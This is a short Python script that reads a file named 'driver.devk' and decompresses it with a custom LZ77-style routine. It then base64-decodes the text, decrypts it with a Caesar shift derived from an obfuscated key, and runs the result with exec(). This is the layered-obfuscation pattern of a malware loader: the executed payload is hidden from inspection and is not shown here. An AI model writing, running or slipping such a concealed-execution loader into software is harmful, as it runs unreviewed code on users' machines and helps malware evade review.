import base64
import struct

def decompress_bytes_to_text(data: bytes) -> str:
    return decompress(data)

def decompress(data_bytes: bytes) -> str:
    output = []
    i = 0
    while i < len(data_bytes):
        offset, length, char = struct.unpack('>HBc', data_bytes[i:i+4])
        i += 4

        if offset == 0 and length == 0:
            output.append(char.decode('latin1'))
        else:
            start = len(output) - offset
            for j in range(length):
                output.append(output[start + j])
            output.append(char.decode('latin1'))

    return ''.join(output)
    
def calculate_shift(key, mult):
    shift = int(key) / int(mult)
    shift_str = str(int(shift))
    shift_bytes = shift_str.encode("utf-8")
    encoded_bytes = base64.b64encode(shift_bytes)
    return encoded_bytes

def get_shift_from_b64(shift_b64):
    shift_bytes = base64.b64decode(shift_b64)
    shift_int = int(shift_bytes.decode("utf-8"))
    return shift_int
    
def autocrack(encrypted_key, multiplier):
    decoded_bytes = base64.b64decode(encrypted_key)
    original_key = decoded_bytes.decode("utf-8")
    shift_b64 = calculate_shift(int(original_key), multiplier)
    shift_value = get_shift_from_b64(shift_b64)
    return shift_value

def decrypt(text, shift):
    text_bytes = base64.b64decode(text)
    text_plain = text_bytes.decode("utf-8")
    text = str(text_plain)
    decrypted = ""
    for char in text:
        if char.isalpha():
            start = 65 if char.isupper() else 97
            decrypted += chr((ord(char) - start - shift) % 26 + start)
        else:
            decrypted += char
    return decrypted

with open("driver.devk", "rb") as f:
    compressed_data = f.read()

text = decompress_bytes_to_text(compressed_data)
key = "Mjg0NzM4NjM="
mult = 7417
shift = autocrack(key, int(mult))
read_enc = str(text)
decrypted_file = decrypt(read_enc, shift)

exec(decrypted_file)


